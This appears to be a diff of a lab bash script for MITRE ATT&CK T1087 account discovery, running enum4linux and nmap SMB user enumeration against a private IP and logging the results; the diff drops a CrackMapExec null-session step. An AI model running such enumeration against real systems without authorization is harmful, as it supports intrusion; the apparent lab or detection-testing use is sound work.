@@ -2,28 +2,32 @@
 # T1087 - Account Discovery Attack Script
 # Author: Greg Lewis
 # Date: 2025-12-20
+# Platform: Kali Linux
 
-# Target IP
 TARGET="192.168.8.18"
+LOGDIR=~/attack-logs/T1087
 
-echo "[*] Starting account enumeration against $TARGET"
-echo "[*] Timestamp: $(date)"
+echo "========================================="
+echo "T1087 - Account Discovery"
+echo "Target: $TARGET"
+echo "Started: $(date)"
+echo "========================================="
+
+# Create log directory
+mkdir -p "$LOGDIR"
+cd "$LOGDIR"
 
 # Method 1: enum4linux
-echo -e "\n[+] Running enum4linux..."
-enum4linux -U "$TARGET" | tee ~/attack-logs/T1087-enum4linux-output.txt
+echo -e "\n[*] Running enum4linux..."
+enum4linux -U "$TARGET" | tee enum4linux-output.txt
+echo "enum4linux completed: $(date)" | tee -a timeline.txt
 
-# Method 2: nmap SMB enumeration
-echo -e "\n[+] Running nmap SMB user enumeration..."
-sudo nmap -p 445 --script smb-enum-users "$TARGET" | tee ~/attack-logs/T1087-nmap-output.txt
+# Method 2: nmap SMB user enumeration
+echo -e "\n[*] Running nmap SMB enumeration..."
+sudo nmap -p 445 --script smb-enum-users "$TARGET" | tee nmap-smb-output.txt
+echo "nmap completed: $(date)" | tee -a timeline.txt
 
-# Method 3: CrackMapExec (if available)
-if command -v crackmapexec &> /dev/null; then
-    echo -e "\n[+] Running CrackMapExec..."
-    crackmapexec smb "$TARGET" -u '' -p '' --users | tee ~/attack-logs/T1087-cme-output.txt
-else
-    echo "[!] CrackMapExec not installed, skipping..."
-fi
-
-echo -e "\n[*] Enumeration complete!"
-echo "[*] Logs saved to ~/attack-logs/"
+echo -e "\n========================================="
+echo "Attack completed: $(date)"
+echo "Logs saved to: $LOGDIR"
+echo "========================================="
